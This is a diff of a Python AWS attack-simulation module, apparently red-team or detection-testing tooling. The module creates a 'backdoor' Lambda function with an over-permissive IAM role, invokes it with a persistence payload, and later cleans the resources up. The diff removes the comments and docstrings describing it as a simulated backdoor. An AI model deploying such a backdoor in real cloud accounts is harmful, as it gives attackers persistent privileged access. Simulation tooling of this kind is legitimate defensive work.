@@ -5,13 +5,6 @@ import time
 import uuid
 
 def run(profile=None, region=None):
-    """
-    Simulate a Lambda backdoor scenario:
-    1. Create a malicious Lambda function with broad permissions
-    2. Create an API Gateway trigger for remote access
-    3. Set up CloudWatch Events for persistence
-    4. Test the backdoor functionality
-    """
     session_args = {}
     if profile:
         session_args['profile_name'] = profile
@@ -23,13 +16,9 @@ def run(profile=None, region=None):
     iam_client = session.client('iam')
     apigateway_client = session.client('apigateway')
     events_client = session.client('events')
-    
-    # Generate unique identifiers
     function_name = f'backdoor-function-{uuid.uuid4().hex[:8]}'
     role_name = f'backdoor-role-{uuid.uuid4().hex[:8]}'
     policy_name = f'backdoor-policy-{uuid.uuid4().hex[:8]}'
-    
-    # Malicious Lambda function code (simulated)
     lambda_code = '''
 import json
 import boto3
@@ -73,7 +62,6 @@ def lambda_handler(event, context):
         }
 '''
     
-    # Create IAM role with excessive permissions
     trust_policy = {
         "Version": "2012-10-17",
         "Statement": [
@@ -106,14 +94,14 @@ def lambda_handler(event, context):
         ]
     }
     
-    # Create IAM role
+
     iam_client.create_role(
         RoleName=role_name,
         AssumeRolePolicyDocument=json.dumps(trust_policy),
         Description='Backdoor Lambda execution role'
     )
     
-    # Create and attach policy
+
     iam_client.create_policy(
         PolicyName=policy_name,
         PolicyDocument=json.dumps(backdoor_policy),
@@ -128,10 +116,10 @@ def lambda_handler(event, context):
         PolicyArn=policy_arn
     )
     
-    # Wait for role propagation
+
     time.sleep(10)
     
-    # Create Lambda function
+
     role_arn = f'arn:aws:iam::{account_id}:role/{role_name}'
     
     lambda_client.create_function(
@@ -150,8 +138,7 @@ def lambda_handler(event, context):
             }
         }
     )
-    
-    # Test the backdoor
+
     test_payload = json.dumps({'persist': True})
     response = lambda_client.invoke(
         FunctionName=function_name,
@@ -174,7 +161,6 @@ def lambda_handler(event, context):
     }
 
 def cleanup(profile=None, region=None, function_name=None, role_name=None, policy_name=None):
-    """Clean up Lambda backdoor resources"""
     session_args = {}
     if profile:
         session_args['profile_name'] = profile
@@ -187,15 +173,14 @@ def cleanup(profile=None, region=None, function_name=None, role_name=None, polic
     
     cleanup_results = []
     
-    # Delete Lambda function
+
     if function_name:
         try:
             lambda_client.delete_function(FunctionName=function_name)
             cleanup_results.append(f"Deleted Lambda function: {function_name}")
         except Exception as e:
             cleanup_results.append(f"Error deleting Lambda function: {e}")
-    
-    # Detach and delete policy
+
     if role_name and policy_name:
         try:
             account_id = session.client('sts').get_caller_identity()['Account']
@@ -206,8 +191,7 @@ def cleanup(profile=None, region=None, function_name=None, role_name=None, polic
             cleanup_results.append(f"Deleted IAM policy: {policy_name}")
         except Exception as e:
             cleanup_results.append(f"Error deleting IAM policy: {e}")
-    
-    # Delete IAM role
+
     if role_name:
         try:
             iam_client.delete_role(RoleName=role_name)
